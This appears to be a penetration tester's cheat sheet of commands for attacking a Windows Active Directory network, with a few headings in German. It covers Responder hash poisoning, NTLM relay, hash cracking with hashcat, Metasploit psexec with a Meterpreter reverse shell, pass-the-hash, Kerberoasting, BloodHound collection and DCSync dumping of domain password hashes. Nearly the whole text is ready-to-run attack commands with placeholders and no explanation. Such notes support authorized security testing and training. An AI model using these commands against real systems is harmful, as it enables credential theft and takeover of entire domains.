ip a
sudo netdiscover -r <subnet>/24
sudo nmap -sV -oA initial_scan_quick <ip-range>
sudo nano /etc/responder/Responder.conf
sudo responder -I eth0 -dvPv
Hashes saved: `/usr/share/responder/logs/`

Option1:
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt

Option2:
sudo nano /etc/responder/Responder.conf

```bash
# Terminal 1 - Capture
$ sudo responder -I eth0 -dvPv

# Terminal 2 - Relay
$ impacket-ntlmrelayx -tf targets.txt -smb2support -i

# Terminal 3 - Connect
$ nc 127.0.0.1 11000
```

### Setup
```bash
$ msfconsole
> search psexec
> use exploit/windows/smb/psexec
> set PAYLOAD windows/x64/meterpreter/reverse_tcp
> set LHOST <your-ip>
> set LPORT <port>
```

### Password Attack
```bash
> set SMBDOMAIN <domain>
> set SMBUSER <user>
> set SMBPASS <password>
> set RHOSTS <target-ip>
> exploit
```

### Hash Attack (Pass-the-Hash)
```bash
> set SMBUSER administrator
> unset SMBDOMAIN
> set SMBPASS <ntlm-hash>
> set RHOSTS <target-ip>
> exploit
```

## Manual PSExec (Python)

```bash
# With password
$ impacket-psexec <domain>/<user>:<password>@<target-ip>

# With hash
$ impacket-psexec -hashes :<hash> <domain>/<user>@<target-ip>
```

net user /domain

exit shell

bloodhound-python -u <user> -p <password> -d <domain> -ns <dc-ip> -c all

impacket-secretsdump <domain>/<user>:<password>@<target-ip>

crackmapexec smb <subnet>/24 -u <user> -d <domain> -p <password> --sam
cmedb
hosts
creds

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
```

Hashcat modes:
- `m 1000` - NTLM (Windows)
- `m 5500` - NetNTLMv1  
- `m 5600` - NetNTLMv2

echo "<dc-ip> <dc-hostname>.<domain> <domain>" | sudo tee -a /etc/hosts

impacket-GetUserSPNs <domain>/<user>:<password> -dc-ip <dc-ip> -request -outputfile krb.txt

hashcat -m 13100 krb.txt /usr/share/wordlists/rockyou.txt

## NTDS.dit Dump (DCSync) - braucht Domain Admin

impacket-secretsdump <domain>/<da-user>:<password>@<dc-ip> -just-dc-ntlm

# falls Passwort expired -> Hash statt Passwort nutzen:
impacket-secretsdump -hashes :<NT-HASH> <domain>/<da-user>@<dc-ip> -just-dc-ntlm
